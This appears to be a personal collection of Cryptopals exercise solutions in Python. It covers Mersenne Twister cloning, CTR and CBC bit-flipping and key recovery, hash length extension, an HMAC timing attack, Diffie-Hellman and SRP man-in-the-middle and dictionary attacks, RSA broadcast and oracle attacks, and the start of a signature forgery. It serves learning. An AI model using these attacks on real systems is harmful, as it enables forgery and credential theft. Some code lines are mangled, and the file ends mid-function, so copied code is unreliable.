            if temp%2 != 0:
                temp_shift = temp_shift^0x9908b0df
            self.state[i] = self.state[(i+self.m)%624]^temp_shift
        self.index = 0

    def get_random_number(self):
        if self.index >= 624:
            self.twist()
        y = self.state[self.index]
        y = y^(y>>self.u)
        y = y^((y<>self.l)

        self.index+=1
        return self.int_32(y)

    def int_32(self, number):
        return int(0xFFFFFFFF & number)

class mersenne_rng(object):
    def __init__(self, seed = 5489):
        self.state = [0]*624
        self.f = 1812433253
        self.m = 397
        self.u = 11
        self.s = 7
        self.b = 0x9D2C5680
        self.t = 15
        self.c = 0xEFC60000
        self.l = 18
        self.index = 624
        self.lower_mask = (1<<31 for="" i-1="" i="" in="" range="" seed="" self.f="" self.int_32="" self.state="" self.upper_mask="1<<31" state="" update="">>30)) + i)

    def twist(self):
        for i in range(624):
            temp = self.int_32((self.state[i]&self.upper_mask)+(self.state[(i+1)%624]&self.lower_mask))
            temp_shift = temp>>1
            if temp%2 != 0:
                temp_shift = temp_shift^0x9908b0df
            self.state[i] = self.state[(i+self.m)%624]^temp_shift
        self.index = 0

    def get_random_number(self):
        if self.index >= 624:
            self.twist()
        y = self.state[self.index]
        y = y^(y>>self.u)
        y = y^((y<>self.l)

        self.index+=1
        return self.int_32(y)

    def int_32(self, number):
        return int(0xFFFFFFFF & number)

def crack_mt(numbers):
    state = []
    for n in numbers[0:624]:
        state.append(untemper(n))
    rng = mersenne_rng_cracker(state)
    for n in numbers[624:]:
        p = rng.get_random_number()
        if p != n:
            print("FAILED")
            return
        print(n, p)
    print("SUCCESS!")

if __name__ == "__main__":
    numbers = []
    seed = 3521569528
    rng = mersenne_rng(seed)
    for i in range(1000):
        n = rng.get_random_number()
        numbers.append(n)
    crack_mt(numbers)
	
	------------------------------------------
	challenge 24 
	-----------------
	for i in xrange(2**16):
  padded = 'A' * len(oracle_ciphertext)
  if MT19937Cipher(i).encrypt(padded)[prefix_len:] == oracle_ciphertext[prefix_len:]:
    return i
	
	-------------------------
	challeng 25
-------------------------------
	
	from base64 import b64decode

from .. import random_helper
from ..aes import ctr_encrypt, ctr_decrypt
from ..xor import xor_bytes


def edit(ciphertext, key, offset, newtext):
    key, nonce = key
    plaintext = ctr_decrypt(key, nonce, ciphertext)
    plaintext = plaintext[:offset] + newtext + plaintext[offset+len(newtext):]
    return ctr_encrypt(key, nonce, plaintext)


with open("src/set_4/25.txt") as f:
    # not sure what we mean by the recovered plaintext from the ECB exercice,
    # but let's assume that this is our plaintext...
    secret = b64decode(f.read())

key = random_helper.random_bytes(16)
nonce = int.from_bytes(random_helper.random_bytes(8), byteorder='big')
ciphertext = ctr_encrypt(key, nonce, secret)

# could do block per block, but let's do it all at once...
edited = edit(ciphertext, (key, nonce), 0, bytes([0] * len(ciphertext)))

# 0 ^ keystream gives us our keystream!
keystream = edited
plaintext = xor_bytes(keystream, ciphertext)

assert(plaintext == secret)

----------------------------------------------
challenge 26 
---------------------
from .. import random_helper
from ..aes import ctr_encrypt, ctr_decrypt
from ..xor import xor_bytes


KEY = random_helper.random_bytes(16)
NONCE = int.from_bytes(random_helper.random_bytes(8), byteorder='big')


def escape(s):
    return s.replace("%", "%37").replace("=", "%61").replace(";", "%59")


def unescape(s):
    return s.replace("%59", ";").replace("%61", "=").replace("%37", "%")


token_prefix = "comment1=cooking%20MCs;userdata="
def get_token(userdata):
    global token_prefix
    prefix = token_prefix
    suffix = ";comment2=%20like%20a%20pound%20of%20bacon"
    cookie = prefix + escape(userdata) + suffix
    return ctr_encrypt(KEY, NONCE, cookie.encode('latin-1'))


def is_admin(token):
    cookie = ctr_decrypt(KEY, NONCE, token).decode('latin-1')
    fields = cookie.split(';')
    items = [(key, unescape(value)) for key, value in
             (field.split('=', maxsplit=1) for field in fields
              if "=" in field)]
    return any([item == ('admin', 'true') for item in items])


# escape tests
assert("%61" == escape("="))
assert("%59" == escape(";"))
assert("%37" == escape("%"))
assert("a%61b" == escape("a=b"))
assert("a%3761b" == escape("a%61b"))

# unescape tests
assert("=" == unescape("%61"))
assert(";" == unescape("%59"))
assert("%" == unescape("%37"))
assert("a=b" == unescape("a%61b"))
assert("a%61b" == unescape("a%3761b"))

# is_admin tests
assert(not is_admin(get_token("a")))
assert(not is_admin(get_token(";admin=true")))


target = ";admin=true;".encode('ascii')
original = "a" * len(target)
token = get_token(original)

to_modify = token[len(token_prefix):len(token_prefix) + len(original)]
keystream = xor_bytes(to_modify, original.encode('ascii'))

crafted = xor_bytes(keystream, target)
crafted_token = (token[:len(token_prefix)] + crafted +
                 token[len(token_prefix) + len(crafted):])

assert(is_admin(crafted_token))
------------------------------------------------------------------
  challenge 27
  -------------
from string import printable

from .. import random_helper
from ..aes import cbc_encrypt, cbc_decrypt, get_blocks
from ..xor import xor_bytes


KEY = random_helper.random_bytes(16)
IV = KEY


def escape(s):
    return s.replace("%", "%37").replace("=", "%61").replace(";", "%59")


def get_token(userdata):
    cookie = escape(userdata)
    return cbc_encrypt(KEY, IV, cookie.encode('latin-1'))


class InvalidAsciiError(Exception):
    def __init__(self, message):
        self.message = message


def oracle(token):
    cookie = cbc_decrypt(KEY, IV, token)

    if not all(chr(c) in printable for c in cookie):
        raise InvalidAsciiError(b"'%s' is not ASCII!" % cookie)


# escape tests
assert("%61" == escape("="))
assert("%59" == escape(";"))
assert("%37" == escape("%"))
assert("a%61b" == escape("a=b"))
assert("a%3761b" == escape("a%61b"))

# oracle tests
try:
    oracle(get_token("test"))
except:
    assert(False)
try:
    not oracle(get_token("test\x00"))
    assert(False)
except: pass


secret = "lorem=ipsum;test=fun;padding=dull"
ciphertext = get_token(secret)
c_1, c_2, c_3 = get_blocks(ciphertext)

# We might be unlucky and not get an invalid ASCII character.
# If this happens, add a suffix (which will generate new seemingly random data)
# until it works.
suffix = bytearray()
suffix.extend(c_2 + c_3)  # manage to get valid padding

for _ in range(10):  # try a couple of times
    try:
        plaintext = oracle(c_1 + bytes([0] * 16) + c_1 + suffix)
    except InvalidAsciiError as e:
        plaintext = e.message[1:-15]
        p_1, _, p_3 = get_blocks(plaintext)[0:3]
    
        # p_1 is p_3 ^ K
        key = xor_bytes(p_1, p_3)
        assert(key == KEY)
        exit()

    print("No lowercase ASCII! Adding blocks...")
    suffix.extend(random_helper.random_bytes(16) + c_2 + c_3)

assert(False)
--------------------------------------------------------------------------------
challenge 28

from .. import random_helper
from ..mac import sha1_keyed_mac


KEY = random_helper.random_bytes(16)
# simple test, not much to do here...
assert(sha1_keyed_mac(KEY, b"attack") !=
       sha1_keyed_mac(KEY, b"attack at dawn"))
	   ------------------------------------------------
	   challenge 29 
	   ------------------
	   from .. import mac
from .. import sha1


class Challenge:

	def __init__(self):
		self._secret = b"yellowsubmarine"  # Super secret. Do not share.

	def init_cookie(self):
		cookie = b"comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon"
		cookie_mac = mac.sha1_keyed_mac(self._secret, cookie)
		return cookie, cookie_mac

	def validate(self, cookie, cookie_mac):
		return mac.sha1_keyed_mac(self._secret, cookie) == cookie_mac

	def parse(self, cookie):
		params = cookie.split(b';')
		variables = {}
		for param in params:
			key, value = param.split(b'=', maxsplit=1)
			variables[key] = value.replace(b'%20', b' ')
		return variables

	def get_flag(self, cookie, cookie_mac):
		if not self.validate(cookie, cookie_mac): return False  # Invalid MAC.
		variables = self.parse(cookie)
		return variables.get(b'admin', b'false') == b'true'


challenge = Challenge()
cookie, orig_cookie_mac = challenge.init_cookie()
assert challenge.validate(cookie, orig_cookie_mac)
extra = b";admin=true"

for secret_len in range(32):
	msg_len = secret_len + len(cookie)
	cookie_mac, to_append = sha1.Sha1.length_extension_attack(orig_cookie_mac, msg_len, extra)
	if challenge.validate(cookie + to_append, cookie_mac): break

cookie += to_append
# We should have found the right length. Then these asserts should pass.
assert challenge.validate(cookie, cookie_mac)
assert challenge.get_flag(cookie, cookie_mac)

-----------------------------------------------------------------
challenge 30
-----------------
from .. import mac
from .. import md4


class Challenge:
    # Mostly copied from 29.py.

    def __init__(self):
        self._secret = b"yellowsubmarine"  # Super secret. Do not share.

    def init_cookie(self):
        cookie = b"comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon"
        cookie_mac = mac.md4_keyed_mac(self._secret, cookie)
        return cookie, cookie_mac

    def validate(self, cookie, cookie_mac):
        return mac.md4_keyed_mac(self._secret, cookie) == cookie_mac

    def parse(self, cookie):
        params = cookie.split(b';')
        variables = {}
        for param in params:
            key, value = param.split(b'=', maxsplit=1)
            variables[key] = value.replace(b'%20', b' ')
        return variables

    def get_flag(self, cookie, cookie_mac):
        if not self.validate(cookie, cookie_mac): return False  # Invalid MAC.
        variables = self.parse(cookie)
        return variables.get(b'admin', b'false') == b'true'


challenge = Challenge()
cookie, orig_cookie_mac = challenge.init_cookie()
assert challenge.validate(cookie, orig_cookie_mac)
extra = b";admin=true"

for secret_len in range(32):
    msg_len = secret_len + len(cookie)
    cookie_mac, to_append = md4.Md4.length_extension_attack(orig_cookie_mac, msg_len, extra)
    if challenge.validate(cookie + to_append, cookie_mac): break

cookie += to_append
# We should have found the right length. Then these asserts should pass.
assert challenge.validate(cookie, cookie_mac)
assert challenge.get_flag(cookie, cookie_mac)
--------------------------------------------------------------------
challenge 31 
-----------------------
from .. import mac
from .. import random_helper
from .. import timing_attack


class Challenge():

    def __init__(self):
        self._secret = random_helper.random_bytes(16)

    def upload(self, file, signature, known_bytes=None):
        """Imagine this is an HTTP GET..."""
        hmac = mac.hmac_sha1(self._secret, file)
        if not timing_attack.insecure_compare(
            hmac, signature, delay_ms=2, known_bytes=known_bytes):
            return 500
        print("Successful upload of %s.", file)
        return 200

    def _peek(self, file):
        """Only used to provide debug info in print."""
        hmac = mac.hmac_sha1(self._secret, file)
        print("Psst. You're looking for ", hmac.hex())




challenge = Challenge()

file = b"evil_payload.exe"

challenge._peek(file)

# If this is 'None', we don't "cheat" by skipping delays (extra noise)
# before the last known byte. Adding this to play nice with Travis.
known_bytes = 0


def try_hmac(hmac):
    challenge.upload(file, hmac, known_bytes)


def on_byte_found(hmac, byte_idx):
    global known_bytes
    known_bytes = byte_idx + 1
    print("Byte %d of hmac is %x" % (byte_idx, hmac[byte_idx]))


hmac = timing_attack.comparison_time_attack(
    bytes([0] * 20), try_hmac, per_byte_rounds=10, progress_callback=on_byte_found)
    

assert challenge.upload(file, hmac) == 200
------------------------------------------------------------------
timing_attack.py 
------------------------

import statistics
import time


def time_fn(fn):
    start = time.time()
    fn()
    return time.time() - start


def comparison_time_attack(data, try_data_fn, per_byte_rounds,
    progress_callback=None):
    """Attack a comparison that early-exits when there's a mismatch."""
    data = bytearray(data)
    for i in range(len(data)):
        byte_times = []
        for b in range(256):
            data[i] = b
            times = [time_fn(lambda: try_data_fn(data))
                     for _ in range(per_byte_rounds)]
            byte_times.append(times)
        get_byte_time_fn = lambda b: statistics.median(byte_times[b])
        highest_median_byte = max(range(256), key=get_byte_time_fn)
        data[i] = highest_median_byte
        if progress_callback is not None:
            progress_callback(data, i)
    return bytes(data)


def insecure_compare(a, b, delay_ms=2, known_bytes=0):
    # Note that 'known_bytes' is cheating. But this needs to run on
    # travis in a reasonable time, so only add the delay for unknown
    # bytes. If set to 'None', we don't use known_bytes.
    if len(a) != len(b): return False
    known_bytes = known_bytes or 0
    for i, (aa, bb) in enumerate(zip(a, b)):
        if aa != bb: return False
        if i >= known_bytes: time.sleep(delay_ms / 1000)
    return True
	
	--------------------------------------------
	challenge  32
	-------------------
	from .. import mac
from .. import random_helper
from .. import timing_attack


class Challenge():

    def __init__(self):
        self._secret = random_helper.random_bytes(16)

    def upload(self, file, signature, known_bytes=None):
        """Imagine this is an HTTP GET..."""
        hmac = mac.hmac_sha1(self._secret, file)
        if not timing_attack.insecure_compare(
            hmac, signature, delay_ms=1, known_bytes=known_bytes):
            return 500
        print("Successful upload of %s.", file)
        return 200

    def _peek(self, file):
        """Only used to provide debug info in print."""
        hmac = mac.hmac_sha1(self._secret, file)
        print("Psst. You're looking for ", hmac.hex())




challenge = Challenge()

file = b"evil_payload.exe"

challenge._peek(file)

# If this is 'None', we don't "cheat" by skipping delays (extra noise)
# before the last known byte. Adding this to play nice with Travis.
known_bytes = 0


def try_hmac(hmac):
    challenge.upload(file, hmac, known_bytes)


def on_byte_found(hmac, byte_idx):
    global known_bytes
    known_bytes = byte_idx + 1
    print("Byte %d of hmac is %x" % (byte_idx, hmac[byte_idx]))


hmac = timing_attack.comparison_time_attack(
    bytes([0] * 20), try_hmac, per_byte_rounds=20, progress_callback=on_byte_found)
    

assert challenge.upload(file, hmac) == 200

------------------------------------------------------------------

github upload 
--------------------
touch README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/c0ldlimit/vimcolors.git
git push -u origin master
 
# Push an existing repository from the command line
 
git remote add origin https://github.com/c0ldlimit/vimcolors.git
git push -u origin master


challenge 33
--------------------
Implement Diffie Hellman 
-------------------------------
from .. import dh 
from  ..  import random_helper

def modexp(base, exp, modulus):
if modulus == 1: return 0
result = 1
base = base%modulus
while exp > 0:
if exp% 2 ==1 :
result = (result *  base) % modulus
exp >>= 1
base = (base * base )% modulus
return result 

assert pow(5,15,37) == modexp(5,15,37)

def dh_exchange(p,g):
a = random_helper.random_number(below=p)
A = modexp(g,a,p)
b = random_helper.random_number(below=p)
B = modexp(g,b,p)

s = modexp(B,a,p)

assert s == modexp(A,b,p)

p = 37
g=5
dh_exchange(p,g)


p = dh.MODP_PRIME_1536
g =2
dh_exchange(p,g)


challenge  34
-------------------
from .. import aes
from .. import byteops
from .. import dh
from .. import random_helper
from .. import sha1


# Note that this should only be known by the client.
# Using this to be able to do an assertion in the MITM attack.
SECRET_MESSAGE = b"YELLOW SUBMARINE"


def secret_to_key(s):
    return sha1.sha1(byteops.int_to_bytes(s))[:16]


class Client(dh.DhClient):

    def __init__(self):
        super().__init__(g=2, p=dh.MODP_PRIME_1536)

    def verify(self, server):
        print("C: Sending %s to server." % SECRET_MESSAGE)
        key = secret_to_key(self._s)
        iv = random_helper.random_bytes(16)
        enc = aes.cbc_encrypt(key, iv, SECRET_MESSAGE)
        enc, iv = server.echo(enc, iv)
        assert aes.cbc_decrypt(key, iv, enc) == SECRET_MESSAGE


class Server(dh.DhServer):

    def echo(self, msg, iv):
        key = secret_to_key(self._s)
        msg = aes.cbc_decrypt(key, iv, msg)
        print("S: Received %s." % msg)
        assert msg == SECRET_MESSAGE
        iv = random_helper.random_bytes(16)
        return aes.cbc_encrypt(key, iv, msg), iv


class Mitm(Server):

    def mitm_dh(self, client, server):
        self.real_server = server
        client.initiate_dh(self)

    def respond_dh(self, p, g, A):
        # By pretending that our 'A' is 'p', the server will do
        # s = A^b mod p = p^b mod p = 0 mod p
        # Ignore the real server's 'B'.
        _ = self.real_server.respond_dh(p, g, A=p)
        # Pretend that our 'B' is 'p'. The client will do
        # s = B^a mod p = p^a mod p = 0 mod p
        self._s = 0
        return p


# This on its own should work.
client = Client()
server = Server()

client.initiate_dh(server)
client.verify(server)


# Now let's test our man-in-the-middle attack.
mitm = Mitm()
mitm.mitm_dh(client, server)
client.verify(mitm)

---------------------------
challenge 35
-------------------
from .. import dh


class ParamsMitm(dh.DhClient):

    def __init__(self, server, p, g):
        super().__init__(g, p)
        self.initiate_dh(server)

    def predict_s(self, predicted_s):
        assert predicted_s == self._s


server = dh.DhServer()
p = dh.MODP_PRIME_1536


# With g=1:
# s = g^a^b mod p = 1^a^b mod p = 1 mod p
ParamsMitm(server, p, g=1).predict_s(1)

# With g=p:
# s = g^a^b mod p
#   = p^a^b mod p
#   = 0 mod p
ParamsMitm(server, p, g=p).predict_s(0)
# Note that it's the same for g=0.
ParamsMitm(server, p, g=0).predict_s(0)

# With g=p-1:
# s = g^a^b mod p
#   = (p-1)^a^b mod p
#   = -1 ^ a ^ b mod p
#   = { 1 if a*b is even
#     { -1 if a*b is odd
mitm = ParamsMitm(server, p, g=p-1)
# We can know if 'a'&'b' were even or odd in a similar way:
a_odd = mitm.A == p-1
b_odd = mitm.B == p-1
ab_odd = a_odd and b_odd
mitm.predict_s(p-1 if ab_odd else 1)

-------------------------------------------------------------------
srp.py 
---------------------
import hashlib

from . import byteops
from . import mac
from . import random_helper


def scrambling_key(A, B):
    A_B = byteops.int_to_bytes(A) + byteops.int_to_bytes(B)
    uH = hashlib.sha256(A_B).digest()
    return int.from_bytes(uH, "big")


def password_hash(salt, password):
    xH = hashlib.sha256(salt + password.encode('utf-8')).digest()
    return int.from_bytes(xH, "big")


def hmac_s(salt, session_key):
    key = hashlib.sha256(session_key).digest()
    return mac.hmac_sha256(key, salt)


class SrpServer:

    def __init__(self, g, k, N):
        # {I: (salt, v)} = {username: (salt, verifier)}
        self._users = {}
        # {I: session_key}
        self._sessions = {}
        self.g = g
        self.k = k
        self.N = N

    def store(self, username, password):
        assert username not in self._users
        salt = byteops.int_to_bytes(random_helper.random_number(bits=64))
        x = password_hash(salt, password)
        v = pow(self.g, x, self.N)
        self._users[username] = (salt, v)

    def connect(self, username, A):
        salt, v = self._users[username]
        b = random_helper.random_number(below=self.N)
        B = (self.k * v + pow(self.g, b, self.N)) % self.N
        u = scrambling_key(A, B)
        s = pow(A * pow(v, u, self.N), b, self.N)
        session_key = byteops.int_to_bytes(s)
        self._sessions[username] = session_key
        return salt, B

    def validate(self, username, hmac):
        session_key = self._sessions[username]
        salt, _ = self._users[username]
        assert hmac_s(salt, session_key) == hmac
        print("[S] Connection successful!")


class SrpClient:

    def connect(self, server, username, password):
        a = random_helper.random_number(below=server.N)
        A = pow(server.g, a, server.N)
        salt, B = server.connect(username, A)
        u = scrambling_key(A, B)
        x = password_hash(salt, password)
        s = pow(B - server.k * pow(server.g, x, server.N), a + u * x, server.N)
        self._session_key = byteops.int_to_bytes(s)
        self.validate(server, username, salt)

    def validate(self, server, username, salt):
        hmac = hmac_s(salt, self._session_key)
        server.validate(username, hmac)
		---------------------------------------------------------------
		
		challenge 36 
		--------------------
		from .. import dh
from .. import srp


g = 2
k = 3
N = dh.MODP_PRIME_1536
server = srp.SrpServer(g, k, N)
server.store("jesse", "m0nk3y")

client = srp.SrpClient()
client.connect(server, "jesse", "m0nk3y")
-------------------------------------------------------------
challenge 37 
------------------------
from .. import byteops
from .. import dh
from .. import srp


def predict_s(server, username, A, s):
    salt, _ = server.connect(username, A)
    session_key = byteops.int_to_bytes(s)
    hmac = srp.hmac_s(salt, session_key)
    server.validate(username, hmac)


N = dh.MODP_PRIME_1536
server = srp.SrpServer(g=2, k=3, N=N)
server.store("jesse", "m0nk3y")


# With A=0, the server will do:
# s = (A v^u)^b mod N
#   = (0 v^u)^b mod N
#   =         0 mod N
predict_s(server, "jesse", A=0, s=0)

# Same for A=N or other multiples:
predict_s(server, "jesse", A=N, s=0)
predict_s(server, "jesse", A=5*N, s=0)
----------------------------------------------------------------
HMAC
------------------------------
hmac.new
hmac.digest 
hmac.update
hmac.hexdigest 
hmac.copy
hmac.digest_size
hmac.block_size
hmac.name
hmac.compare_digest(a,b)


challenge 38
------------------
import hashlib

from .. import byteops
from .. import dh
from .. import mod
from .. import random_helper
from .. import srp


class Client:

    def __init__(self, password):
        self._password = password
    
    def connect(self, server, multiply_v=False):
        a = random_helper.random_number(below=server.n)
        A = pow(server.g, a, server.n)
        salt, B, u = server.connect(A, multiply_v=multiply_v)
        x = srp.password_hash(salt, self._password)
        if multiply_v:  # Variant of the protocol where B = v * g^b mod n
            v = pow(server.g, x, server.n)
            B = (B * mod.modinv(v, server.n)) % server.n
        s = pow(B, a + u * x, server.n)
        self._key = hashlib.sha256(byteops.int_to_bytes(s)).digest()
        hmac = srp.hmac_s(salt, self._key)
        server.validate(hmac)


class Server:

    def __init__(self, password, g, n):
        self.g = g
        self.n = n
        self._salt = byteops.int_to_bytes(random_helper.random_number(bits=64))
        x = srp.password_hash(self._salt, password)
        self._v = pow(g, x, n)

    def connect(self, A, multiply_v=False):
        u = random_helper.random_number(bits=128)
        b = random_helper.random_number(below=self.n)
        B = pow(self.g, b, self.n)
        if multiply_v:  # Variant of the protocol where B = v * g^b mod n
            B = (B * self._v) % self.n
        s = pow(A * pow(self._v, u, self.n), b, self.n)
        self._key = hashlib.sha256(byteops.int_to_bytes(s)).digest()
        return self._salt, B, u

    def validate(self, hmac):
        assert hmac == srp.hmac_s(self._salt, self._key)


class Mitm(Server):

    def __init__(self, client, server):
        self.client = client
        self.real_server = server
        self.n = server.n
        self.g = server.g

    def connect(self, A, multiply_v=False):
        self.A = A
        # Replace 'B' with ours, one where we'll know 'b'.
        self.b = random_helper.random_number(below=self.n)
        # Note that we explicitly never multiply v if that option is on (we
        # don't know it). We'll deal with that during the brute-force.
        B = pow(self.g, self.b, self.n)
        self.salt, _, self.u = self.real_server.connect(A)
        return self.salt, B, self.u

    def validate(self, hmac):
        self.hmac = hmac  # this is our brute-force target.
        # In practice, we would fake a connection lost here.
        pass  # Always good :)


def dictionary_attack(mitm, multiply_v=False):
    with open("src/set_5/38.txt") as f:
        passwords = [password.strip() for password in f.readlines()]

    for password in passwords:
        x = srp.password_hash(mitm.salt, password)
        v = pow(mitm.g, x, mitm.n)
        exponent = mitm.b
        if multiply_v:  # Variant of the protocol where B = v * g^b mod n
            exponent = (exponent - x) % mitm.n
        s = pow(mitm.A * pow(v, mitm.u, mitm.n), exponent, mitm.n)
        key = hashlib.sha256(byteops.int_to_bytes(s)).digest()
        if srp.hmac_s(mitm.salt, key) == mitm.hmac:
            return password  # Found the password!

    return None  # Failed to find a valid password.


# Assume we can't see that password. It's taken from the dictionary 38.txt.
client = Client("september")
server = Server("september", g=2, n=dh.MODP_PRIME_1536)
client.connect(server)

# Now MITM to pass some fixed values. We can then brute-force.
mitm = Mitm(client, server)
client.connect(mitm)

password = dictionary_attack(mitm)
print("Recovered password:", password)
# Should be able to connect with that password now. :)
Client(password).connect(server)

# Out of curiosity, we also try with a variant of the protocol where we instead
# do B = v * g^b mod n. We show that we can still brute-force that offline.
client = Client("november")
server = Server("november", g=2, n=dh.MODP_PRIME_1536)
client.connect(server, multiply_v=True)  # Test that it works by default
# Now mitm:
mitm = Mitm(client, server)
client.connect(mitm, multiply_v=True)
password = dictionary_attack(mitm, multiply_v=True)
print("Recovered password (multiply_v):", password)
Client(password).connect(server)
-------------------------------------------------
challenge 39 
--------------------
from .. import rsa


r = rsa.Rsa(e=3, p=17, q=89)
assert r.decrypt(r.encrypt(42)) == 42
assert r.decrypt_bytes(r.encrypt_bytes(b"\x42")) == b"\x42"

r = rsa.Rsa(e=3, bits=1024)
assert r.decrypt(r.encrypt(1337)) == 1337
assert r.decrypt_bytes(r.encrypt_bytes(b"Hello World!")) == b"Hello World!"
---------------------------------------------------------------------------
rsa.py
------------------
from . import byteops
from . import mod
from . import prime


class Rsa:

    def __init__(self, e, bits=None, p=None, q=None):
        """Creates an RSA key with random bits modulus"""
        assert (bits is not None) ^ (p is not None and q is not None)
        if bits is not None:
            while True:
                p = prime.random_prime(bits // 2)
                q = prime.random_prime(bits // 2)
                if self.try_gen_params(p, q, e):
                    break
        elif p is not None and q is not None:
            assert prime.is_prime(p) and prime.is_prime(q)
            assert self.try_gen_params(p, q, e)
        else:
            raise NotImplementedError()

    def try_gen_params(self, p, q, e):
        self.n = p * q
        self.e = e
        totient = (p - 1) * (q - 1)
        if mod.gcd(totient, e) != 1:
            return False
        self._d = mod.modinv(e, totient)
        return True

    def public_key(self):
        """(e, n)"""
        return self.e, self.n

    def _private_key(self):
        """(d, n)"""
        return self._d, self.n

    def encrypt(self, m):
        assert m < self.n
        return pow(m, self.e, self.n)

    def encrypt_bytes(self, m):
        m = int.from_bytes(m, "big")
        c = self.encrypt(m)
        return byteops.int_to_bytes(c)

    def decrypt(self, c):
        assert c < self.n
        return pow(c, self._d, self.n)

    def decrypt_bytes(self, c):
        c = int.from_bytes(c, "big")
        m = self.decrypt(c)
        return byteops.int_to_bytes(m)

    def sign(self, m):
        return self.decrypt(m)

    def verify(self, signature):
        return self.encrypt(signature)
		
		---------------------------------------------------------------
		challenge 40 
		-------------------
		from .. import mod
from .. import roots
from .. import rsa


# The secret message that we want to recover.
PRIVATE_MESSAGE = int.from_bytes(b"Hello this is a secret message.", "big")


def add_padding(m, modulus_bits, padding_len):
    padding_bits = padding_len * 8
    padding = (1 << padding_bits) - 1  # [0xFF] * padding_len
    # Note: we keep first byte as 0x00 to ensure < modulus
    assert modulus_bits > 8 + padding_bits
    padding <<= modulus_bits - 8 - padding_bits
    assert m < padding
    return padding | m
assert add_padding(0x42, modulus_bits=4*8, padding_len=2) == 0x00FFFF42


def remove_padding(padded_m, padding_len):
    padding_bits = padding_len * 8
    assert padded_m.bit_length() > padding_bits
    m_bits = padded_m.bit_length() - padding_bits
    mask = (1 << m_bits) - 1
    return padded_m & mask
assert remove_padding(add_padding(0x42, modulus_bits=4*8, padding_len=2),
                      padding_len=2) == 0x42


def capture_messages(e, bits=1024, padding_fn=None):
    """Returns a list of 'e' (ciphertext, mudolus) pairs."""
    m = PRIVATE_MESSAGE
    parties = [rsa.Rsa(e=e, bits=bits) for _ in range(e)]
    m = padding_fn(m) if padding_fn is not None else m
    return [(r.encrypt(m), r.n) for r in parties]


# First of all, if p is small, we can directly recover it (it doesn't ever wrap
# around N):
print("[*] Recovering m^3 for small m.")
print("      gen keys & encrypt...")
c = rsa.Rsa(e=3, bits=1024).encrypt(PRIVATE_MESSAGE)
print("      cube root...")
assert roots.iroot(c, 3) == PRIVATE_MESSAGE
print("      recovered!")

# If we add some static "padding" at the start, causing p^3 to wrap, we can
# still recover p through CRT.
print("[*] Recovering m^3 for larger m, that wraps around N.")
static_pad = lambda m: add_padding(m, modulus_bits=1024, padding_len=3)
print("      capturing 3 ciphertexts...")
((c_0, n_0), (c_1, n_1), (c_2, n_2)) = capture_messages(e=3, bits=1024,
                                                        padding_fn=static_pad)
print("      checking that cube root isn't sufficient...")
assert remove_padding(roots.iroot(c_0, 3), padding_len=3) != PRIVATE_MESSAGE
print("      crt...")
c = mod.crt(residues=[c_0, c_1, c_2], moduli=[n_0, n_1, n_2])
print("      cube root...")
p = roots.iroot(c, 3)
assert remove_padding(p, padding_len=3) == PRIVATE_MESSAGE
print("      recovered!")

----------------------------------------------
challenge 41 
--------------------
import hashlib

from .. import byteops
from .. import mod
from .. import rsa


class Server:

    def __init__(self):
        self.rsa = rsa.Rsa(e=2**16+1, bits=1024)
        self._hashes = set()

    def encrypt(self, msg):
        return self.rsa.encrypt_bytes(msg)

    def decrypt(self, msg):
        """Note: can only be called once per message."""
        hash_ = hashlib.sha256(msg).digest()
        if hash_ in self._hashes: return None  # Can't!
        self._hashes.add(hash_)
        return self.rsa.decrypt_bytes(msg)


server = Server()

# Requests made by the client we're targetting
PRIVATE_MESSAGE = b"{ time: 1356304276, social: '555-55-5555', }"
intercepted = server.encrypt(PRIVATE_MESSAGE)
assert server.decrypt(intercepted) == PRIVATE_MESSAGE
assert server.decrypt(intercepted) is None  # Only works once.

s = 2  # Anything > 1 mod N
c = int.from_bytes(intercepted, "big")
c_prime = (pow(s, server.rsa.e, server.rsa.n) * c) % server.rsa.n
# s^e * c mod N
# = s^e * p^e mod N
# = (s * p)^e mod N

# p' = s * p mod N
p_prime = int.from_bytes(server.decrypt(byteops.int_to_bytes(c_prime)), "big")
s_inv = mod.modinv(s, server.rsa.n)
p = (p_prime * s_inv) % server.rsa.n
assert byteops.int_to_bytes(p) == PRIVATE_MESSAGE
-----------------------------------------------------------------
challenge 42
-----------------
import hashlib
import re

from .. import bitops
from .. import byteops
from .. import pkcs1_v1_5
from .. import random_helper
from .. import roots
from .. import rsa


def sign(r, msg, bits):
    assert b"hi mom" not in msg  # Not allowed!
    digest = hashlib.sha1(msg).digest()
    padded = pkcs1_v1_5.encode(pkcs1_v1_5.sha1_digest_info(digest),
                               total_len=bits//8)
    return r.sign(int.from_bytes(padded, "big"))


def validate_prefix_match(r, msg, signature, bits):
    """Looks for hash without making sure that it's right-justified."""
    # I.e. gets hash by parsing ASN.1 blob after matching regex:
    # 0001(ff)+00(.*)
    # From original attack on mailing list:
    # https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/
    padded = r.verify(signature).to_bytes(bits//8, "big")
    m = re.fullmatch(b"\x00\x01\xff+\x00(.*)", padded, re.DOTALL)
    if m is None:
        print("Bad hash format!")
        return False
    digest_info = m.group(1)
    digest = pkcs1_v1_5.get_digest(digest_info)
    return hashlib.sha1(msg).digest() == digest


def validate_prefix_suffix(r, msg, signature, bits):
    """Looks for hash without checking the padding bytes."""
    # I.e. gets hash by parsing ASN.1 blob after matching regex:
    # 0001[^00]*00(.*)
    # And ensuring that ASN.1 parsing leaves no leftover bytes.
    # From attack listed on (CVE-2016-1494):
    # https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/
    # This is one of the tricks used in BERserk.
    padded = r.verify(signature).to_bytes(bits//8, "big")
    m = re.fullmatch(b"\x00\x01[^\x00]*\x00(.*)", padded, re.DOTALL)
    if m is None:
        print("Bad hash format!")
        return False
    digest_info = m.group(1)
    digest = pkcs1_v1_5.get_digest(digest_info, ensure_full_parse=True)
    if digest is None:
        print("Hash is not right-justified!")
        return False
    return hashlib.sha1(msg).digest() == digest


def _forge_cubed_prefix(target_prefix, total_len, padding_len, suffix=b"",
                        forbidden_padding_byte=None):
    """Forges a signature (with suffix) with given target prefix when cubed.
    If specified, will retry until bytes in
    cube[len(target_prefix), -len(suffix)] do not contain the
    forbidden_padding_byte (e.g. if we can't have null bytes in padding).
    Will also retry if the cube we attempt with fixed suffix does not give the
    desired prefix anymore.
    """
    print("    Crafting prefix", end="")
    while True:
        print(".", end="")
